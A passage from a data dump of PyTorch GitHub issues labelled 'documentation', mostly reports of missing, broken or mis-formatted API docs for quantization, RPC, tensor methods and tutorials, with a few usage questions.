@rohan-varma @xush6528"},{"labels":["documentation",null,null],"text":"The doc now looks like below. I would assume the path was not intended to be there?\r\n\r\n<img width=\"877\" alt=\"Screen Shot 2019-11-14 at 4 12 15 PM\" src=\"https://user-images.githubusercontent.com/16999635/68906684-fb3e2a00-06f9-11ea-812a-90e66aecc787.png\">\r\n\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nI think the documentation shouldn't include an _out=_ option,\r\nI don't see any _unsqueeze_out()_ function in ATen..\r\n\r\n```\r\n>>> torch.unsqueeze(torch.tensor([1,2.0]),-1,out=r)\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: unsqueeze() got an unexpected keyword argument 'out'\r\n```"},{"labels":["documentation",null,null],"text":"test_docs_coverage does not cover quantization.rst. It should. \r\n\r\nhttps://github.com/pytorch/pytorch/issues/27938\n\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a"},{"labels":["documentation",null],"text":"The following works:\r\n```\r\n>>> torch.__version__\r\n'1.4.0a0+5635a72'\r\n\r\n>>> x.mean(dtype=torch.float)\r\ntensor(1.5000)\r\n>>> help(x.mean)\r\n\r\n>>> x.mean(dim=1, dtype=torch.float)\r\ntensor([1.6667, 1.3333])\r\n\r\n```\r\n\r\nYet the doc doesn't say anything about the `dtype` argument:\r\n```\r\nHelp on built-in function mean:\r\n\r\nmean(...) method of torch.Tensor instance\r\n    mean(dim=None, keepdim=False) -> Tensor or (Tensor, Tensor)\r\n\r\n    See :func:`torch.mean`\r\n```"},{"labels":["documentation",null],"text":"From Supriya \r\nCan we add a note on the quantization page about setting the qengine to \"qnnpack\" if running on mobile? \r\nhttps://discuss.pytorch.org/t/fbgemm-with-pytorch-mobile/60752/4\n\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a"},{"labels":[null,"documentation",null],"text":""},{"labels":[null,"documentation",null],"text":"https://pytorch.org/docs/stable/nn.html#torch.nn.Conv2d \r\n\r\nAll there is is\r\n`padding_mode (string, optional) ‚Äì zeros`"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\nFor our 1.4 RC, we should have a simple hello-world style tutorial that shows users how to use the model parallel/rpc APIs for simple multi-machine/ParameterServer training. The examples can be simple and concise such as the ones given in https://github.com/pytorch/pytorch/issues/23110, but should have a detailed walkthrough explaining the concepts and APIs used.\r\n\r\ncc @ezyang @gchanan @zou3519 @jerryzh168 @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528"},{"labels":[null,"documentation",null],"text":"## üêõ Bug\r\n\r\nThese instructions are missing and we should add them.\r\n\r\nBasically:\r\n* Install pkg-config\r\n* Install libuv\r\n* Compile with `USE_LIBUV=ON`\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nThe Tensor documentation page has broken links to torchtext, torchaudio, and C++ API. These broken links do not appear on the main documentation page.\r\n\r\nhttps://pytorch.org/docs/stable/tensors.html\r\n\r\n<img width=\"435\" alt=\"Screen Shot 2019-11-01 at 1 23 03 PM\" src=\"https://user-images.githubusercontent.com/655866/68043204-1f861980-fcab-11e9-9327-8f05b4b350b9.png\">"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nIn-place functions are documented inconsistently. For example functions that generate samples from a distribution have a section called \"In-place random sampling\", however there is no other documentation for other in-place functions.\r\n\r\nFor example `pow_()` and `log_()` are not documented anywhere. Other in-place functions like `fill_()` are referenced in example code but not mentioned.\r\n\r\nIt would be good to document all in-place functions that are first-class citizens. Or tag functions in some way that have an in-place variant.\r\n"},{"labels":["documentation",null,null],"text":"how do we get the size of a particular named dimension ? Today, I get it as shown below, but it seems round about. Is there a better way to doing the same ?\r\n\r\n```\r\n>>> t = torch.zeros((3, 224, 400), names=('C', 'H', 'W'))\r\n>>> \r\n>>> t.shape[t.names.index('H')]\r\n224\r\n\n\ncc @zou3519"},{"labels":["documentation",null,null],"text":"`distributed_c10d` has a nice doc page [here](https://pytorch.org/docs/stable/distributed.html), and the source code of that live in [here](https://github.com/pytorch/pytorch/blob/master/docs/source/distributed.rst). We should add a similar page for rpc and distributed autograd to describe the API.\r\n\r\n@rohan-varma brought up a point that whether we want to add the new docs into the existing `distributed.rst` file as `distributed/distributed_c10d.py`, `distributed/rpc/` and `distributed/autograd` all live in the same `distributed/` folder, or whether we want to keep them in separate files. I would vote for keeping them separate from the existing one, as the existing one mostly focus on c10d, and the new ones are on rpc/autograd, which are quite different topics. The following items would need more discussion and let's track them here:\r\n\r\n1. The title of the existing `distributed.rst` page says **Distributed communication package - torch.distributed**, do we want to rename that to _Distributed collective communication package - torch.distributed_ to be more precise?\r\n2. Should rpc and distributed autograd api docs live in the same file? \r\n\r\n \n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nThe documentation pages can be viewed for different versions using the [versions page](https://pytorch.org/docs/versions.html). However, when navigating to the \"Tutorials\", the versions cannot be selected. This is a problem for the experimental parts (s.a. quantization), as we update the tutorials in master, which cannot be viewed."},{"labels":["documentation",null],"text":"As discussed in this issue in the forum: https://discuss.pytorch.org/t/font-in-the-instructions-are-not-sharp-in-chrome-browser/59365/2\r\n\r\nThe font is not always sharp for all users\r\n\r\ncc @jlin27 "},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nThe torch.from_file function is not documented. Only the [torch.Storage.from_file](https://pytorch.org/docs/stable/storage.html#torch.FloatStorage.from_file) is documented, but it's not clear how to create a Tensor from that function. Specifically, it requires knowing that you can construct a Tensor from a storage using the constructor `torch.Tensor(storage)`. That constructor is no longer documented."},{"labels":["documentation",null],"text":"Even if it is internal/experimental, it's quite useful for end users as well.\r\n\r\nCurently [`fuse_conv_bn_weights`](https://github.com/pytorch/pytorch/blob/master/torch/nn/utils/fusion.py#L22) assumes 2d convolution and hard-codes 4-dim weights, which is not true for Conv1d/Conv3d. However it's easy to support any dimension:\r\n```python\r\n# conv_w = conv_w * (bn_w * bn_var_rsqrt).reshape([-1, 1, 1, 1])\r\nconv_w = conv_w * (bn_w * bn_var_rsqrt).reshape([-1] + [1] * (len(conv_w.shape) - 1))\r\n```"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/nn.html?highlight=multiheadattention#torch.nn.MultiheadAttention currently looks like this:\r\n\r\n- **Note** ‚Äì if kdim and vdim are None, they will be set to embed_dim such that\r\n- **key, and value have the same number of features.** (*query,*) ‚Äì\r\n\r\ni.e. formatting went badly.\r\n\r\nAlso docs don't mention that `embed_dim` must be divisible by `nheads` and what's the reason for this requirement (it seems that the module assumes that the projection of the all heads is done prior to this module)"},{"labels":[null,"documentation",null,null],"text":"flatten_parameters missing docs online: https://pytorch.org/docs/master/search.html?q=flatten_parameters&check_keywords=yes&area=default\r\n\r\nWhile docs are there in the code:\r\nhttps://github.com/pytorch/pytorch/blob/master/torch/nn/modules/rnn.py#L99\n\ncc @ezyang @gchanan @zou3519 @jerryzh168"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nHere in the description of resize:\r\n`\r\nThis is a low-level method. The storage is reinterpreted as C-contiguous, ignoring the current strides (unless the target size equals the current size, in which case the tensor is left unchanged). For most purposes, you will instead want to use view(), which checks for contiguity, or reshape(), which copies data if needed. To change the size in-place with custom strides, see set_().\r\n`\r\n\r\n`as_strided_` has clearer semantics than `set_` (which can also change the storage, which isn't relevant for the situation in question."},{"labels":[null,null,null,"documentation",null],"text":"## üêõ Bug\r\n\r\nEven the official [docs for cpp extensions](https://pytorch.org/tutorials/advanced/cpp_extension.html) use `gates.data<scalar_t>()` but I get deprecation warning.\r\n\r\n## To Reproduce\r\n\r\n>  warning: ‚ÄòT* at::Tensor::data() const [with T = float]‚Äô is deprecated [-Wdeprecated-declarations]                                                                                                                               /home/ehazar/miniconda3/envs/py3_night/lib/python3.6/site-packages/torch/include/ATen/core/TensorBody.h:312:1: note: declared here                                                                                                                                                 T * data() const {\r\n\r\n\r\n## Expected behavior\r\n\r\nProvide a non-deprecated way for cpp extensions. Similarly, no alternative to `AT_CHECK`/`AT_ASSERTM` nor `torch::jit::RegisterOperators()` is provided for cpp extensions.\r\n\r\n## Environment\r\n\r\nCollecting environment information...\r\nPyTorch version: 1.4.0.dev20191018\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.0\r\n\r\nOS: Ubuntu 16.04.6 LTS\r\nGCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609\r\nCMake version: version 3.14.0\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: Could not collect\r\nGPU models and configuration: GPU 0: GeForce GTX 1070\r\nNvidia driver version: 418.40.04\r\ncuDNN version: /usr/local/lib/libcudnn.so.5.1.10\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.17.2\r\n[pip] torch==1.4.0.dev20191018\r\n[pip] torchvision==0.5.0a0+155c504\r\n[conda] Could not collect\r\n\n\ncc @yf225"},{"labels":[null,"documentation",null,null,null,null,null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nCurrently the signature of `torch.addcdiv` is documented to be:\r\n\r\n```\r\naddcdiv(input, value=1, tensor1, tensor2, out=None) -> Tensor\r\n```\r\n\r\nSee e.g. https://pytorch.org/docs/stable/torch.html#torch.addcdiv\r\n\r\nThis can't be correct because it has positional arguments following keyword arguments, which is invalid in Python.\r\n\r\nWhen I intentionally pass an invalid number of arguments, I get:\r\n\r\n```\r\nIn [10]: torch.addcdiv(t, 0.1)\r\n---------------------------------------------------------------------------\r\nTypeError                                 Traceback (most recent call last)\r\n<ipython-input-10-38c653649e23> in <module>\r\n----> 1 torch.addcdiv(t, 0.1)\r\n\r\nTypeError: addcdiv() received an invalid combination of arguments - got (Tensor, float), but expected (Tensor input, Tensor tensor1, Tensor tensor2, Number value, Tensor out)\r\n```\r\n\r\nSo I guess `value` *is* optional and it should be moved to the end of the argument list.  However, I wanted to double check before putting in a PR with the fix since that means that the doctest in the docstring for `addcdiv` is incorrect.\n\ncc @ezyang @gchanan @zou3519 @jerryzh168 @SsnL"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\n`default_qconfig` doesn't exist as an attribute, so it is better to label it as ``default_qconfig``\r\n![image](https://user-images.githubusercontent.com/5652049/66953340-5235de00-f02c-11e9-92c5-6719ccca7ff3.png)\r\n\r\n_Originally posted by @zou3519 in https://github.com/_render_node/MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDMzNTY3NTE3Mw==/comments/review_comment_\n\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nHey folks, there is a `__config__` section showing up in the docs which leads to a 404 page; see\r\n- https://pytorch.org/docs/stable/index.html\r\n- https://pytorch.org/docs/stable/__config__.html\r\n\r\nSee screenshot below\r\n\r\n![torch-config](https://user-images.githubusercontent.com/527241/66940551-6b975400-f045-11e9-9bb4-555399ab72fe.png)\r\n\r\nShould probably be removed or the linked page fixed; thanks!"},{"labels":[null,"documentation",null],"text":"Afaict TestTorch.test_doc tests that certain functions on torch are documented. This is similar to what TestDocCoverage does and it would be great to have all of the documentation tests in one single location.\r\n\r\nhttps://github.com/pytorch/pytorch/blob/fd3d6587e60de816106d6b8dc0f586f9fa52a7ac/test/test_torch.py#L183\n\ncc @ezyang @zou3519"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nFor example: https://pytorch.org/docs/stable/quantization.html#torch-nn-quantized-functional\r\n\r\n![Screen Shot 2019-10-14 at 2 34 10 PM](https://user-images.githubusercontent.com/4216323/66784641-ec145400-ee8f-11e9-8404-3717bad82df8.png)\r\n\r\nThis also includes #27849\r\n\r\n\r\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100"},{"labels":["documentation",null,null],"text":"https://pytorch.org/docs/stable/onnx.html#torch.onnx.export\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/66771893-71e0d100-ee89-11e9-9ef1-6004b6fc2373.png)\r\n"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nhttps://pytorch.org/docs/master/optim.html#torch.optim.lr_scheduler.CosineAnnealingWarmRestarts\r\n\r\n![image](https://user-images.githubusercontent.com/10709657/66767963-1b54b080-eee4-11e9-92bf-71d0d176d8f0.png)\r\n![image](https://user-images.githubusercontent.com/10709657/66767998-2dceea00-eee4-11e9-90b1-41440665df6b.png)\r\n\n\ncc @vincentqb"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nhttps://pytorch.org/docs/master/nn.functional.html#torch.nn.functional.kl_div\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/66766584-6804a100-ee7c-11e9-9c32-fb9dd7cde5b8.png)\r\n\r\n"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/stable/named_tensor.html#explicit-alignment-by-names\r\n\r\n```\r\nscale = torch.randn(num_channels, names='C')\r\n```\r\nshould be `scale = torch.randn(num_channels, names=['C'])`\n\ncc @zou3519"},{"labels":[null,"documentation",null],"text":"The documentation has an[entry for it](https://github.com/pytorch/pytorch/blob/master/docs/source/cuda.rst), but the documentation website [doesn't have it](https://pytorch.org/docs/master/cuda.html)."},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\nWhile working on fixing #25347, I found out that `torch.lgamma` appears to be undocumented.\r\n\r\n```\r\n>>> import torch\r\n>>> help(torch.lgamma)\r\nHelp on built-in function lgamma:\r\n\r\nlgamma(...)\r\n```\n\ncc @ezyang @gchanan @zou3519"},{"labels":[null,null,"documentation",null],"text":"https://github.com/pytorch/pytorch/blob/master/docs/source/torch.rst (scroll down to default_generators)\n\ncc @ezyang @gchanan @zou3519 @jerryzh168"},{"labels":[null,"documentation",null,null],"text":"We are missing documentation for:\r\n- cuda.get_rng_state_all\r\n- cuda.set_rng_state_all\r\n- cuda.manual_seed_all\r\n- cuda.seed_all\r\n\r\nIn torch.random: https://pytorch.org/docs/master/random.html"},{"labels":[null,"documentation",null],"text":"Some of our docs link to \"CUDA documentation\" render incorrectly:\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/66680833-414d2d00-ec26-11e9-8347-5da72167ccb5.png)\r\n\n\ncc @ezyang @gchanan @zou3519"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nHere: https://pytorch.org/docs/master/optim.html?highlight=cycliclr#torch.optim.lr_scheduler.CyclicLR\r\n\r\n![image](https://user-images.githubusercontent.com/10709657/66622721-5f616000-ec1b-11e9-81b2-f0a6b999ee24.png)\r\n\r\nthe three built-in policies can be illustrated in the Parameter section.\r\n\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\n\ncc @vincentqb"},{"labels":[null,"documentation",null,null],"text":"I see the pytorch1.3 is now available, quantization is added, greate! but as the descriptionÔºö\r\n '\"\"This currently experimental feature includes support for post-training quantization, dynamic quantization, and quantization-aware training. It leverages the FBGEMM and QNNPACK state-of-the-art quantized kernel back ends, for x86 and ARM CPUs, respectively, which are integrated with PyTorch and now share a common API.\r\n\"\"\"\r\n\r\nmeans the quantizationed model can only use the FBGEMM and QNNPACK(cpu backends) and cannot deploy the quantizationed model with cuda backend?\r\nmeans now all the pytorch's  quantization ops are created just for cpus like arm and x86?\r\n\r\nThank you!\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":[null,"documentation",null],"text":"We should ideally be able to build all the docs in a single command. Right now we build the docs for pytorch and torchvision separately and \"copy and paste\" the docs for torchvision into pytorch. This is not very efficient and it's easy to forget this last step. \n\ncc @ezyang"},{"labels":[null,"documentation",null],"text":"Right now, we require a CUDA installation of pytorch to build docs. I think this is necessary for the following reasons:\r\n\r\n- Some of our operators are \"turned off\" in a CPU-only build\r\n- torch.distributed is \"turned off\" in a CPU-only build.\r\n\r\nIt would be nice to refactor the code such that all docstrings and APIs are available in a CPU-only build and error out gracefully instead of having those APIs be completely missing.\r\n\r\nThis would speed up documentation building time; we wouldn't have to wait for a full CUDA build of pytorch.\n\ncc @ezyang"},{"labels":["documentation",null],"text":"There were some other pip packages that I needed to install that I don't remember right now.\r\n\r\nFurthermore, the docs require the following that we should document somewhere:\r\n- global installation from katex\n\ncc @ezyang @gchanan @zou3519"},{"labels":[null,"documentation",null,null],"text":"## üêõ Bug\r\n\r\nafter our v1.3.0 doc changes i am seeing a test failure\r\n\r\nFAIL: test_torch (__main__.TestDocCoverage)\r\n\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. git checkout upstream master\r\n2. python ./test/test_docs_coverage.py\r\n\r\nAssertionError: Items in the second set but not the first:\r\n'real'\r\n'imag'\r\n'conj'\r\n'angle' : \r\nThe lists of tensor methods documented in tensors.rst and in python are\r\ndifferent. Did you forget to add a new thing to tensors.rst, or whitelist\r\nthings you don't want to document?\r\n\r\n======================================================================\r\nFAIL: test_torch (__main__.TestDocCoverage)\r\n----------------------------------------------------------------------\r\nTraceback (most recent call last):\r\n  File \"./test/test_docs_coverage.py\", line 73, in test_torch\r\n    don't want to document?''')\r\nAssertionError: Items in the first set but not the second:\r\n'promote_types'\r\n'result_type'\r\n'can_cast'\r\nItems in the second set but not the first:\r\n'quantize_per_tensor'\r\n'quantize_per_channel' : \r\nThe lists of functions documented in torch.rst and in python are different.\r\nDid you forget to add a new thing to torch.rst, or whitelist things you\r\ndon't want to document?\r\n\r\n----------------------------------------------------------------------\r\nRan 2 tests in 0.003s\r\n\r\nFAILED (failures=2)\r\n\r\n## Expected behavior\r\n\r\n\r\ngit checkout pr-fix-doc-test-failure\r\n\r\ngottbrath@ubuntu:~/pytorch-for-doc$ python ./test/test_docs_coverage.py \r\n..\r\n----------------------------------------------------------------------\r\nRan 2 tests in 0.003s\r\n\r\nOK\r\n\r\n\r\n\n\ncc @ezyang"},{"labels":[null,null,"documentation",null,null],"text":"When the model does not contain a custom layer, it can be deployed directly on the C + + side using JIT mechanism and libtorch library.\r\n\r\nBut my model contains a custom c++ and CUDA layer. Now that I'm deploying the model on the c++ side, do I need to compile the custom c++ and CUDA layers into the libtorch library?\r\nThank you!!!\n\ncc @suo @yf225"},{"labels":["documentation",null],"text":"## ‚ùì Questions and Help\r\n\r\n\r\nIf want to add Bert for pytorch community,  can I put the models and weights of BERT into the repository of **pytorch/text** ?\r\nAs **pytorch/vision**  is for Models specific to Computer Vision,  but i can't find any NLP models in   **pytorch/text**"},{"labels":[null,"documentation",null],"text":"## üêõ Bug\r\n\r\nAssigning `nn.Module`s as attributes of an `nn.Sequential` will append them to the \"execution list\" and therefore automatically call in `forward`, instead of merely registering them for inclusion in `nn.Sequential.parameters()`. This is not mentioned in the documentation.\r\n\r\n## To Reproduce\r\nRunning the following code:\r\n\r\n```python\r\nclass CustomSeq(nn.Sequential):\r\n    def __init__(self):\r\n        super(CustomSeq, self).__init__(\r\n            nn.Linear(3, 4),\r\n            nn.Linear(4, 5),\r\n        )\r\n\r\n        self.bar = nn.Linear(4, 5)\r\n\r\nnet = CustomSeq()\r\nprint(net)\r\n```\r\nwill result in\r\n\r\n```\r\nCustomSeq(\r\n  (0): Linear(in_features=3, out_features=4, bias=True)\r\n  (1): Linear(in_features=4, out_features=5, bias=True)\r\n  (bar): Linear(in_features=4, out_features=5, bias=True)\r\n)\r\n```\r\n\r\nand fail when passed an `N x 3` tensor (because of 5 vs 4 shape mismatch at the end of execution).\r\n\r\n## Expected behavior\r\n\r\nI am not sure what the print format should be, but ideally I would like to see that only the modules passed in the constructor are executed in `forward` (the [documentation](https://pytorch.org/docs/master/nn.html#torch.nn.Sequential) only mentions constructors) and the modules added via `__setattr__` would be treated as if they were assigned to a regular `nn.Module`, that is registered but not automatically executed. Another solution would be to just document this as a feature.\r\n\r\nMy preference for the former is that I have code which looks like this\r\n```python\r\nclass CustomSeq(nn.Sequential):\r\n    def __init__(self):\r\n        meta = MetaParameterModule(...)\r\n        super(CustomSeq, self).__init__(\r\n            CustomLayer(meta, ...),\r\n            CustomLayer(meta, ...),\r\n            ...\r\n        )\r\n        self.meta = meta\r\n```\r\nwhere `MetaParameterModule` doesn't even implement `forward`, it just stores some learnable interpolation parameters global to `CustomSeq`, which I would like to easily access. I was very surprised seeing that running `CustomSeq()(input)` results in `NotImplementedError`. I can obviously workaround with something like\r\n\r\n```python\r\n@property\r\ndef meta(self):\r\n    return self[0].meta\r\n```\r\nbut it's a bit awkward.\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.2.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: None\r\n\r\nOS: Ubuntu 18.04.3 LTS\r\nGCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0\r\nCMake version: version 3.10.2\r\n\r\nPython version: 3.7\r\nIs CUDA available: No\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\nVersions of relevant libraries:\r\n[pip] Could not collect\r\n[conda] cpuonly                   1.0                           0    pytorch\r\n[conda] pytorch                   1.2.0               py3.7_cpu_0  [cpuonly]  pytorch\r\n[conda] torchvision               0.4.0                  py37_cpu  [cpuonly]  pytorch\r\n"},{"labels":["documentation",null,null,null],"text":"![Screen Shot 2019-10-09 at 10 55 32 AM](https://user-images.githubusercontent.com/45861273/66507093-6a818800-ea83-11e9-8333-28ee3b918e4b.png)\r\n\r\n\r\nthis is in the supported operations list on quantization.rst\n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":[null,"documentation",null],"text":"In tutorial https://pytorch.org/tutorials/beginner/blitz/autograd_tutorial.html\r\nunder Gradients\r\n\r\n![jac](https://user-images.githubusercontent.com/20665510/66342644-88f26100-e967-11e9-9e34-3811148d5ca4.PNG)\r\n\r\n\n\ncc @ezyang"},{"labels":["documentation",null,null,null],"text":"<img width=\"794\" alt=\"convrelu2d-nits\" src=\"https://user-images.githubusercontent.com/45861273/66273545-b46f3180-e829-11e9-8204-8babdf30f1bd.png\">\r\n\r\nI have two concerns here;\r\n\r\n#1 -- highlighted with two squares on the image -- it seems like when we say we use the same args as another function we should have a link to the documentation on the other function. \r\n\r\n#2 -- highlighted with ovals on the image -- in the docstring this is written as \"same as ...\" but in the doc it takes the first word and puts it in parenthesis after the rest.  Not sure why that is happening. \r\n\r\nIf I am reading the gitjhub correctly @dskhudia  is the author of this bit of the code. Perhaps he can help. \n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":[null,"documentation",null,null,null,null],"text":"<img width=\"798\" alt=\"formatting-issue-either-or\" src=\"https://user-images.githubusercontent.com/45861273/66273196-95bb6b80-e826-11e9-8cd8-8fcb2a2759dd.png\">\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nSpotted quite a few grammar and punctuation issues while reading the main README.md file, would like to fix as my first contribution to Pytorch.\r\n\r\nA few of these issues include:\r\n\r\n - L148: \"They **requires** JetPack 4.2 and above and are maintained by @dusty-nv\r\n\"\r\n- L127 \"There is no wrapper code that needs to be written.\" ‚Äî fix \"No wrapper code needs to be written.\"\r\n\r\nAnd more.\r\n"},{"labels":["documentation",null,null,null],"text":"just missing a colon. the fix is \r\n\r\ngit diff\r\ndiff --git a/docs/source/quantization.rst b/docs/source/quantization.rst\r\nindex e318ead0a0..092ec45fa4 100644\r\n--- a/docs/source/quantization.rst\r\n+++ b/docs/source/quantization.rst\r\n@@ -383,5 +383,5 @@ DeQuantize\r\n\r\n Linear\r\n ------------------\r\n-.. autoclass: Linear\r\n+.. autoclass:: Linear\r\n     :members:\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":["documentation",null,null,null],"text":"<img width=\"1475\" alt=\"escape-character-end-of-workflows\" src=\"https://user-images.githubusercontent.com/45861273/66262462-8fc97a00-e795-11e9-962d-48075ab8a07c.png\">\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":["documentation",null,null,null],"text":"<img width=\"1475\" alt=\"formatting-in-operation-coverage\" src=\"https://user-images.githubusercontent.com/45861273/66262438-ba670300-e794-11e9-9ff3-7f37800bc8ca.png\">\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":["documentation",null,null],"text":"reviewing the draft quantization documentation. \r\n\r\nhttps://htmlpreview.github.io/?https://raw.githubusercontent.com/gottbrath/pytorch/temp-review-quant-doc/docs/review-doc/html/nn.html#quantized-functions\r\n\r\nhere is what this looks like now. I think it needs a little more textual context. \r\n\r\n<img width=\"1475\" alt=\"torch nn-quantization-section-needs-text\" src=\"https://user-images.githubusercontent.com/45861273/66262401-a66ed180-e793-11e9-9677-f87d70f2828f.png\">\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":["documentation",null,null,null],"text":"<img width=\"883\" alt=\"observer-docstring-issue\" src=\"https://user-images.githubusercontent.com/45861273/66261525-cd250c00-e783-11e9-9c6d-b8eabb4a1b8f.png\">\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":[null,null,null,"documentation",null],"text":"There are no docs for `ctx.save_for_backward`. No found links have docs for `save_for_backward` itself: https://pytorch.org/docs/master/search.html?q=save_for_backward&check_keywords=yes&area=default\r\n\r\nIt would be good if these new docs mentioned that it has no effect in no_grad mode and does not needlessly hold onto tensors: https://discuss.pytorch.org/t/save-for-backward-in-no-grad-mode/57316\r\n\r\nProbably `saved_tensors` is not formally documented either.\n\ncc @ezyang @gchanan @zou3519 @SsnL @albanD @gqchen"},{"labels":["documentation",null,null],"text":"When I checkout the [`quantization_1_3_doc` branch](https://github.com/gottbrath/pytorch/tree/quantization_1_3_doc/docs), run make html from /docs, and look at the index.html, all the old quantization docs show up even though the [index.rst ](https://github.com/gottbrath/pytorch/blob/quantization_1_3_doc/docs/source/index.rst)lists quantization.rst. \r\n\r\nDid some testing and research and it looks like it's because in quantization.rst there are multiple H1 headers. We would need to decrease all the headers except the first by one level. \r\n\r\n![image](https://user-images.githubusercontent.com/8042156/66173258-1b130600-e604-11e9-914c-7f3e2b874aa7.png)\r\n"},{"labels":["documentation",null,null,null],"text":"\r\n![image-from-design-doc](https://user-images.githubusercontent.com/45861273/66162193-ba270600-e5e2-11e9-835f-354f5aac7934.png)\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":["documentation",null],"text":"[torch.Tensor.mean](https://pytorch.org/docs/master/tensors.html#torch.Tensor.mean) is documented to sometimes return a tuple, but [torch.mean](https://pytorch.org/docs/master/torch.html#torch.mean) is not. "},{"labels":[null,"documentation",null,null],"text":"add quantized tensor creation functions on torch.tensor( ) documentation, add the torch.quantize_per_tensor() and torch.quantize_per_channel(). \r\n\r\n\r\n@raghuramank100 for visibility"},{"labels":["documentation",null,null],"text":"Create a table listing which methods work on the quantized tensors (only a subset of the tensor methods work). "},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n`Tensor.scatter_add_` states that the indices need to be unique, but this appears not to be the case (note that this comment is missing from `gather()` docs):\r\n> Moreover, as for gather(), the values of index must be between 0 and self.size(dim) - 1 inclusive, and all values in a row along the specified dimension dim must be unique.\r\n\r\nHowever:\r\n```\r\nimport torch\r\nx = torch.zeros(5)\r\nx.scatter_add_(0, torch.tensor([0, 0, 4]), torch.tensor([1., 3., 5.]))\r\nprint(x) . # => [4, 0, 0, 0, 5]\r\n```\r\n\r\nAlso, if the indices need to be unique, `scatter_add_` would be an incorrect backwards pass for `gather()`, whose indices do not need to be unique, according to current docs.\r\n\r\nDocs at:\r\nhttps://pytorch.org/docs/stable/tensors.html#torch.Tensor.scatter_add_\r\n"},{"labels":["documentation",null,null],"text":"Raghu and I were talking and it would be good to add some color commentary to the torch.quantized.modules.floatFunctional entry explaining why this exits (rather than adding an add in the nn module). This came up in some of the developer feedback on the API. Knowing the design considerations might help people understand why they have to take this step. "},{"labels":["documentation",null,null],"text":"\r\n"},{"labels":["documentation",null,null,null],"text":"This issue drifted a bit. What was finally fixed was the missing set of docs for the fused functions in torch.nn.intrinsic \r\n\r\noriginal description: \r\nThe doc for ConvBn2d is missing. I see it in the rst file and I can get the docstring with a print on the class's __doc__ attribute in pytorch. \r\n\r\n<img width=\"1725\" alt=\"missing-function-ConvBn2d\" 